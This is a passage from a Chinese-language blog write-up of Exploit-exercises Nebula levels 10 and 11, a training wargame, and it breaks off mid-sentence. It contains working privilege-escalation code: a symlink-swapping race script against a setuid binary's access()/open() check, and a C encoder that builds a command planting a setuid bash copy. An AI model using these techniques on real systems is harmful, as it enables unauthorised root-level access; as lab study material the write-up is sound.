<!doctype html><html lang=zh-hans><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta name=author content="Liq3e"><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-166034540-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><link rel=prev href=https://blog.usec.cc/posts/security/reverse/format-string/><link rel=next href=https://blog.usec.cc/posts/security/ctf/wp-for-junior-0ctf/><link rel=canonical href=https://blog.usec.cc/posts/security/misc/exploit-exercises-nebula-2/><link rel=icon type=image/png sizes=32x32 href=/favicon.ico><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>Exploit-exercises Nebula (Level10~19) | L33'</title><meta name=title content="Exploit-exercises Nebula (Level10~19) | L33'"><link rel=stylesheet href=/font/iconfont.css><link rel=stylesheet href=/css/main.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.usec.cc/"},"articleSection":"posts","name":"Exploit-exercises Nebula (Level10~19)","headline":"Exploit-exercises Nebula (Level10~19)","description":"æœ¬æ–‡æ˜¯åœ¨è§£å†³Exploit-exercesesä¸ŠNebulaä¸­é¢˜ç›®ï¼ˆLevel10~19ï¼‰æ—¶çš„ä¸€äº›æ€è€ƒä¸è®°å½•ã€‚ Level10 é¢˜ç›®æè¿°ï¼š The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call. æºç ï¼š #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;sys/types.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;fcntl.h\u0026gt;#include \u0026lt;errno.h\u0026gt;#include \u0026lt;sys/socket.h\u0026gt;#include \u0026lt;netinet/in.h\u0026gt;#include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { char *file; char *host; if(argc \u0026lt; 3) { printf(\u0026#34;%s file host\\n\\tsends file to host if you have access to it\\n\u0026#34;, argv[0]); exit(1); } file = argv[1]; host = argv[2]; if(access(argv[1], R_OK) == 0) { int fd; int","inLanguage":"zh-Hans","author":"Liq3e","creator":"Liq3e","publisher":"Liq3e","accountablePerson":"Liq3e","copyrightHolder":"Liq3e","copyrightYear":"2017","datePublished":"2017-11-21T00:00:00+08:00","dateModified":"2017-11-21T00:00:00+08:00","url":"https://blog.usec.cc/posts/security/misc/exploit-exercises-nebula-2/","wordCount":5832,"keywords":["exploit-exercises","L33'"]}</script></head><body><div class=wrapper><nav class=navbar><div class=container><div class="navbar-header header-logo"><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.usec.cc/>L33'</a></div><div class="menu navbar-right"><a class=menu-item href=/posts/>Posts</a>
<a class=menu-item href=/categories/>Categories</a>
<a class=menu-item href=/tags/>Tags</a>
<a class=menu-item href=/about/ title=About>About</a></div></div></nav><nav class=navbar-mobile id=nav-mobile style=display:none><div class=container><div class=navbar-header><div><a href=javascript:void(0); class=theme-switch><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href=https://blog.usec.cc/>L33'</a></div><div class=menu-toggle><span></span><span></span><span></span></div></div><div class=menu id=mobile-menu><a class=menu-item href=/posts/>Posts</a>
<a class=menu-item href=/categories/>Categories</a>
<a class=menu-item href=/tags/>Tags</a>
<a class=menu-item href=/about/ title=About>About</a></div></div></nav><main class=main><div class=container><article class=post-warp itemscope itemtype=http://schema.org/Article><header class=post-header><h1 class=post-title itemprop="name headline">Exploit-exercises Nebula (Level10~19)</h1><div class=post-meta>Written by <a itemprop=name href=https://blog.usec.cc/ rel=author>Liq3e</a> with â™¥
<span class=post-time>on <time datetime=2017-11-21 itemprop=datePublished>November 21, 2017</time></span>
in
<i class="iconfont icon-folder"></i><span class=post-category><a href=https://blog.usec.cc/categories/security/>Security</a></span></div></header><div class=post-content><p>æœ¬æ–‡æ˜¯åœ¨è§£å†³<a href=https://exploit-exercises.com>Exploit-exerceses</a>ä¸Š<strong>Nebula</strong>ä¸­é¢˜ç›®ï¼ˆLevel10~19ï¼‰æ—¶çš„ä¸€äº›æ€è€ƒä¸è®°å½•ã€‚</p><h2 id=level10>Level10</h2><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>The setuid binary at <strong>/home/flag10/flag10</strong> binary will upload any file given, as long as it meets the requirements of the <a href=http://linux.die.net/man/2/access>access()</a> system call.</p></blockquote><p>æºç ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;errno.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/socket.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;netinet/in.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
{
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>file;
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>host;

  <span style=color:#66d9ef>if</span>(argc <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>3</span>) {
      printf(<span style=color:#e6db74>&#34;%s file host</span><span style=color:#ae81ff>\n\t</span><span style=color:#e6db74>sends file to host if you have access to it</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, argv[<span style=color:#ae81ff>0</span>]);
      exit(<span style=color:#ae81ff>1</span>);
  }

  file <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>1</span>];
  host <span style=color:#f92672>=</span> argv[<span style=color:#ae81ff>2</span>];

  <span style=color:#66d9ef>if</span>(access(argv[<span style=color:#ae81ff>1</span>], R_OK) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
      <span style=color:#66d9ef>int</span> fd;
      <span style=color:#66d9ef>int</span> ffd;
      <span style=color:#66d9ef>int</span> rc;
      <span style=color:#66d9ef>struct</span> sockaddr_in sin;
      <span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>4096</span>];

      printf(<span style=color:#e6db74>&#34;Connecting to %s:18211 .. &#34;</span>, host); fflush(stdout);

      fd <span style=color:#f92672>=</span> socket(AF_INET, SOCK_STREAM, <span style=color:#ae81ff>0</span>);

      memset(<span style=color:#f92672>&amp;</span>sin, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> sockaddr_in));
      sin.sin_family <span style=color:#f92672>=</span> AF_INET;
      sin.sin_addr.s_addr <span style=color:#f92672>=</span> inet_addr(host);
      sin.sin_port <span style=color:#f92672>=</span> htons(<span style=color:#ae81ff>18211</span>);

      <span style=color:#66d9ef>if</span>(connect(fd, (<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>sin, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> sockaddr_in)) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
          printf(<span style=color:#e6db74>&#34;Unable to connect to host %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, host);
          exit(EXIT_FAILURE);
      }

<span style=color:#75715e>#define HITHERE &#34;.oO Oo.\n&#34;
</span><span style=color:#75715e></span>      <span style=color:#66d9ef>if</span>(write(fd, HITHERE, strlen(HITHERE)) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
          printf(<span style=color:#e6db74>&#34;Unable to write banner to host %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, host);
          exit(EXIT_FAILURE);
      }
<span style=color:#75715e>#undef HITHERE
</span><span style=color:#75715e></span>
      printf(<span style=color:#e6db74>&#34;Connected!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Sending file .. &#34;</span>); fflush(stdout);

      ffd <span style=color:#f92672>=</span> open(file, O_RDONLY);
      <span style=color:#66d9ef>if</span>(ffd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
          printf(<span style=color:#e6db74>&#34;Damn. Unable to open file</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
          exit(EXIT_FAILURE);
      }

      rc <span style=color:#f92672>=</span> read(ffd, buffer, <span style=color:#66d9ef>sizeof</span>(buffer));
      <span style=color:#66d9ef>if</span>(rc <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
          printf(<span style=color:#e6db74>&#34;Unable to read from file: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf(<span style=color:#e6db74>&#34;wrote file!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);

  } <span style=color:#66d9ef>else</span> {
      printf(<span style=color:#e6db74>&#34;You don&#39;t have access to %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, file);
  }
}
</code></pre></div><p>å¯ä»¥çœ‹åˆ°ï¼Œæ•´ä¸ªç¨‹åºçš„é€»è¾‘æ˜¯é¦–å…ˆåˆ©ç”¨<code>access()</code>å‡½æ•°ç¡®å®šç”¨æˆ·æ˜¯å¦å¯¹æ–‡ä»¶å…·æœ‰è¯»æƒé™ï¼Œå¦‚æœæ˜¯çš„è¯åˆ™å»ºç«‹TCPè¿æ¥ã€æ‰“å¼€è¯»å–æ–‡ä»¶ä¼ è¾“ã€‚</p><p>è¿™å…¶ä¸­çš„trickåœ¨äº<strong><code>access()</code>å‡½æ•°æ£€æŸ¥çš„æ˜¯è¿›ç¨‹çš„<code>real user</code>å¯¹äºä¸€ä¸ªæ–‡ä»¶çš„æƒé™ï¼Œè€Œ<code>open()</code>å‡½æ•°æ“ä½œæ–‡ä»¶çš„æƒé™åˆ™æ˜¯å–å†³äº<code>effective use</code>çš„æƒé™</strong>ã€‚è€Œè¿™ä¸¤ä¸ªæ“ä½œæ˜¯åˆ†å¼€çš„ï¼Œæ‰€ä»¥è¿™å°±é€ æˆäº†<a href=https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use>TOCTOU(time of check to time of use)</a>æ¼æ´ï¼Œè¿™æ˜¯ä¸€ä¸ª<strong>race condition</strong>ç±»å‹çš„æ¼æ´åˆ©ç”¨ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªé“¾æ¥æ–‡ä»¶ï¼Œä½¿å¾—åœ¨<code>access()</code>æ£€æŸ¥çš„æ—¶å€™å®ƒé“¾æ¥åˆ°level10ç”¨æˆ·æœ‰è¯»æƒé™çš„æ–‡ä»¶ï¼Œè€Œåœ¨openæ—¶ï¼Œä½¿å¾—å®ƒé“¾æ¥åˆ°tokenæ–‡ä»¶ã€‚</p><p>ç¼–å†™shellè„šæœ¬ï¼ˆ/tmp/flag10.shï¼‰ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>
ln -fs /tmp/flag10.sh /tmp/flag10.ln
/home/flag10/flag10 /tmp/flag10.ln 127.0.0.1 &amp;

<span style=color:#66d9ef>for</span> <span style=color:#f92672>((</span>i <span style=color:#f92672>=</span> 0; i &lt; 300; i++<span style=color:#f92672>))</span>; <span style=color:#66d9ef>do</span>
	echo $i &gt; /dev/null
<span style=color:#66d9ef>done</span>

ln -fs /home/flag10/token /tmp/flag10.ln
</code></pre></div><p>å…¶ä¸­<code>&</code>ç¬¦åˆæ˜¯ä¸ºäº†åå°è¿è¡Œï¼Œå°±å¯ä»¥éé˜»å¡çš„æ‰§è¡Œä¸‹ä¸€æ¡è¯­å¥ï¼›æ’å…¥ä¸€ä¸ªforå¾ªç¯æ˜¯ä¸ºäº†å»¶åé“¾æ¥æ–‡ä»¶çš„ç›®æ ‡æ–‡ä»¶æ›´æ”¹æ—¶é—´ï¼Œä½¿å¾—å®ƒèƒ½å¤Ÿåœ¨<code>access()</code>æ£€æŸ¥å®Œæˆåå¹¶åœ¨<code>open()</code>æ‰§è¡Œå‰æ‰§è¡Œï¼ˆå½“ç„¶è¿™æ˜¯ä¸ç¡®å®šèƒ½100%æˆåŠŸçš„ï¼Œå¯ä»¥è°ƒèŠ‚å¾ªç¯æ¬¡æ•°ï¼‰ã€‚</p><p>éšåæˆ‘ä»¬å¯ä»¥åœ¨å¦å¤–ä¸€ä¸ªç»ˆç«¯é‡Œç›‘å¬18211ç«¯å£ï¼š</p><pre><code>nc -lk 18211
</code></pre><p>å¯ä»¥æ”¶åˆ°tokenæ–‡ä»¶å†…å®¹ï¼š</p><pre><code>.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
</code></pre><h2 id=level11>Level11</h2><p>é¢˜ç›®æºç ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/mman.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#75715e>/*
</span><span style=color:#75715e> * Return a random, non predictable file, and return the file descriptor for it.
</span><span style=color:#75715e> */</span>

<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>getrand</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>path)
{
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>tmp;
  <span style=color:#66d9ef>int</span> pid;
  <span style=color:#66d9ef>int</span> fd;

  srandom(time(NULL));

  tmp <span style=color:#f92672>=</span> getenv(<span style=color:#e6db74>&#34;TEMP&#34;</span>);
  pid <span style=color:#f92672>=</span> getpid();
  
  asprintf(path, <span style=color:#e6db74>&#34;%s/%d.%c%c%c%c%c%c&#34;</span>, tmp, pid,
      <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>), <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>),
      <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>), <span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>),
      <span style=color:#e6db74>&#39;0&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>10</span>), <span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>+</span> (random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>26</span>));

  fd <span style=color:#f92672>=</span> open(<span style=color:#f92672>*</span>path, O_CREAT<span style=color:#f92672>|</span>O_RDWR, <span style=color:#ae81ff>0600</span>);
  unlink(<span style=color:#f92672>*</span>path);
  <span style=color:#66d9ef>return</span> fd;
}

<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>process</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>buffer, <span style=color:#66d9ef>int</span> length)
{
  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> key;
  <span style=color:#66d9ef>int</span> i;

  key <span style=color:#f92672>=</span> length <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>;

  <span style=color:#66d9ef>for</span>(i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> length; i<span style=color:#f92672>++</span>) {
      buffer[i] <span style=color:#f92672>^=</span> key;
      key <span style=color:#f92672>-=</span> buffer[i];
  }

  system(buffer);
}

<span style=color:#75715e>#define CL &#34;Content-Length: &#34;
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv)
{
  <span style=color:#66d9ef>char</span> line[<span style=color:#ae81ff>256</span>];
  <span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>1024</span>];
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>mem;
  <span style=color:#66d9ef>int</span> length;
  <span style=color:#66d9ef>int</span> fd;
  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>path;

  <span style=color:#66d9ef>if</span>(fgets(line, <span style=color:#66d9ef>sizeof</span>(line), stdin) <span style=color:#f92672>==</span> NULL) {
      errx(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;reading from stdin&#34;</span>);
  }

  <span style=color:#66d9ef>if</span>(strncmp(line, CL, strlen(CL)) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
      errx(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;invalid header&#34;</span>);
  }

  length <span style=color:#f92672>=</span> atoi(line <span style=color:#f92672>+</span> strlen(CL));
  
  <span style=color:#66d9ef>if</span>(length <span style=color:#f92672>&lt;</span> <span style=color:#66d9ef>sizeof</span>(buf)) {
      <span style=color:#66d9ef>if</span>(fread(buf, length, <span style=color:#ae81ff>1</span>, stdin) <span style=color:#f92672>!=</span> length) {
          err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;fread length&#34;</span>);
      }
      process(buf, length);
  } <span style=color:#66d9ef>else</span> {
      <span style=color:#66d9ef>int</span> blue <span style=color:#f92672>=</span> length;
      <span style=color:#66d9ef>int</span> pink;

      fd <span style=color:#f92672>=</span> getrand(<span style=color:#f92672>&amp;</span>path);

      <span style=color:#66d9ef>while</span>(blue <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
          printf(<span style=color:#e6db74>&#34;blue = %d, length = %d, &#34;</span>, blue, length);

          pink <span style=color:#f92672>=</span> fread(buf, <span style=color:#ae81ff>1</span>, <span style=color:#66d9ef>sizeof</span>(buf), stdin);
          printf(<span style=color:#e6db74>&#34;pink = %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, pink);

          <span style=color:#66d9ef>if</span>(pink <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0</span>) {
              err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;fread fail(blue = %d, length = %d)&#34;</span>, blue, length);
          }
          write(fd, buf, pink);

          blue <span style=color:#f92672>-=</span> pink;
      }    

      mem <span style=color:#f92672>=</span> mmap(NULL, length, PROT_READ<span style=color:#f92672>|</span>PROT_WRITE, MAP_PRIVATE, fd, <span style=color:#ae81ff>0</span>);
      <span style=color:#66d9ef>if</span>(mem <span style=color:#f92672>==</span> MAP_FAILED) {
          err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;mmap&#34;</span>);
      }
      process(mem, length);
  }

}
</code></pre></div><p><code>process()</code>å‡½æ•°å†…å‰é¢çš„å¼‚æˆ–åå‘å¤„ç†éå¸¸ç®€å•ï¼Œä¸å†è¡¨è¿°ã€‚æœ€å¼€å§‹å°†ç›®å…‰èšç„¦äºä¸‹é¢ä¸€æ®µä»£ç ï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>if</span>(fread(buf, length, <span style=color:#ae81ff>1</span>, stdin) <span style=color:#f92672>!=</span> length) {
	err(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;fread length&#34;</span>);
}
process(buf, length);
</code></pre></div><p>ä½†æ˜¯å‘ç°<code>fread()</code>çš„ç¬¬äºŒã€ä¸‰ä¸ªå‚æ•°çš„å€¼æœ‰äº›åˆ«æ‰­ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒçš„è¿”å›å€¼åªèƒ½æ˜¯1æˆ–0ï¼Œæ‰€ä»¥lengthå°±åªèƒ½æ˜¯1äº†ã€‚æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œä¸€ä¸ªå­—æ¯çš„å‘½ä»¤ï¼Œè¿™å¯ä»¥é€šè¿‡å¢åŠ <code>$PATH</code>å˜é‡ã€ç„¶åé“¾æ¥æ¥å®ç°å‘½ä»¤æ‰§è¡Œã€‚ä½†ä¸€ä¸ªé—®é¢˜æ˜¯åªå†™å…¥ä¸€ä¸ªå­—æ¯ï¼Œè¿å­—ç¬¦ä¸²ç»“æŸç¬¦<code>\0</code>éƒ½ä¸èƒ½æ’å…¥ï¼Œæ‰€ä»¥åªèƒ½å¤šæ¬¡å°è¯•ï¼Œä»¥æœŸæ ˆä¸Šçš„åä¸€ä¸ªå­—èŠ‚æ­£å¥½æ˜¯<code>0x00</code>ã€‚</p><p>ä¸Šé¢çš„æ–¹æ³•è¿‡äºéº»çƒ¦ï¼Œæ‰€ä»¥è½¬è€Œçœ‹elseä¸­çš„ä»£ç ï¼Œåªæ˜¯è¦æ±‚è¾“å…¥é•¿åº¦å¤§äº1024ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç›´æ¥åœ¨å‘½ä»¤åå¡«å……æ— ç”¨å­—èŠ‚å°±å¯ä»¥ã€‚å®ç°ç¨‹åºï¼š</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>//code.c
</span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
	<span style=color:#66d9ef>char</span> str[<span style=color:#ae81ff>1025</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;cp /tmp/bash /home/flag11/;chmod +s /home/flag11/bash;&#34;</span>;
	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> strlen(str); i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1025</span>; i<span style=color:#f92672>++</span>) {		
		str[i] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0</span>;
	}
	<span style=color:#66d9ef>int</span> length <span style=color:#f92672>=</span> <span style=color:#ae81ff>1025</span>;
	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> key <span style=color:#f92672>=</span> length <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xff</span>;

	<span style=color:#66d9ef>char</span> c;
	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> length; i<span style=color:#f92672>++</span>) {
		c <span style=color:#f92672>=</span> str[i];
		str[i] <span style=color:#f92672>^=</span> key;
		key <span style=color:#f92672>-=</span> c;
	}

	<span style=color:#75715e>//FILE *f = fopen(&#34;/tmp/flag11&#34;, &#34;wb&#34;);
</span><span style=color:#75715e></span>	fprintf(stdout, <span style=color:#e6db74>&#34;Content-Length: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, length);
	<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> length; i<span style=color:#f92672>++</span>) {
		fputc(str[i], stdout);
	}
	<span style=color:#75715e>//fclose(f);
</span><span style=color:#75715e></span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>ä»ç„¶æ‰“ç®—é‡‡ç”¨æˆ‘ä»¬ä¹‹å‰çš„è·å–shellå¥—è·¯ï¼Œè®¾ç½®å¥½<code>TEMP</code>çš„ç¯å¢ƒå˜é‡ä¹‹åæ‰§è¡Œç¨‹åºï¼š</p><p><img src=level11_3.png alt></p><p>ç»“æœå´å‘ç°æç¤ºæ²¡æœ‰æƒé™ï¼Œç™¾æ€ä¸å¾—å…¶è§£ã€‚ä½¿ç”¨IDAé€†å‘<code>flag11</code>ç¨‹åºåå‘ç°ï¼Œåœ¨æ‰§è¡Œ<code>system()</code>å‡½æ•°å‰å…ˆå°†<code>effective user id</code>åˆè®¾ç½®äº†å›å»ï¼š</p><p><img src=level11_1.png alt></p><p>è¿™ä¸é¢˜ç›®ä¸­ç»™å‡ºçš„æºç å¹¶ä¸ç›¸åŒğŸ˜‚ï¼Œæœ¬ä»¥ä¸ºå·²åˆ°äº†ç»è·¯ã€‚åæ¥é€šè¿‡æŸ¥æ‰¾<a href=https://gist.github.com/graugans/88e6f54c862faec8b3d4bf5789ef0dd9>èµ„æ–™</a>å‘ç°ï¼Œå…¶å®é¢˜ç›®ç¨‹åºä¸­è¿˜æœ‰å¦å¤–å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ï¼šå†™æ–‡ä»¶ã€‚åœ¨è¿›è¡Œå†™æ–‡ä»¶çš„æ—¶å€™ï¼Œåˆ©ç”¨çš„ä»ç„¶æ˜¯<code>effective user id</code>ï¼Œå¯ä»¥ä»¥flag11çš„æƒé™æ¥å†™æ–‡ä»¶ï¼Œè¿™ä¹Ÿæ˜¯é¢˜ç›®ä¸­è´¹å°½å¿ƒæœºè¦æä¸€ä¸ªéšæœºæ–‡ä»¶åçš„ç›®çš„ã€‚</p><p>é¢˜ç›®æºç ä¸­ç”Ÿæˆéšæœºæ–‡ä»¶åä¸€æ˜¯ä½“ç°åœ¨<code>pid</code>ä¸Šï¼Œä½†ä¸€èˆ¬æ¥è¯´æ–°å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œå®ƒçš„<code>pid</code>æ˜¯ä¼šæ¯”ä¸Šä¸€ä¸ªè¿›ç¨‹çš„<code>pid</code>è‡ªå¢1çš„ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯å¯é¢„æµ‹çš„ï¼Œå³ä¸ºç®¡é“å·¦é¢çš„ç¨‹åº<code>pid+1</code>ï¼›å¦ä¸€ä¸ªæ˜¯ä½“ç°åœ¨éšæœºæ•°ä¸Šï¼Œä½†è¿™é‡Œç”¨åˆ°çš„æ˜¯ä¼ªéšæœºï¼Œé€šè¿‡<code>srandom()</code>è®¾ç½®çš„ç§å­åªè¦ç›¸åŒï¼Œä¹‹åäº§ç”Ÿçš„éšæœºæ•°åºåˆ—éƒ½æ˜¯ä¸€è‡´çš„ï¼Œè€Œè¿™é‡Œç”¨åˆ°çš„<code>time()</code>å‡½æ•°å•ä½æ˜¯<strong>ç§’</strong>ï¼Œå› 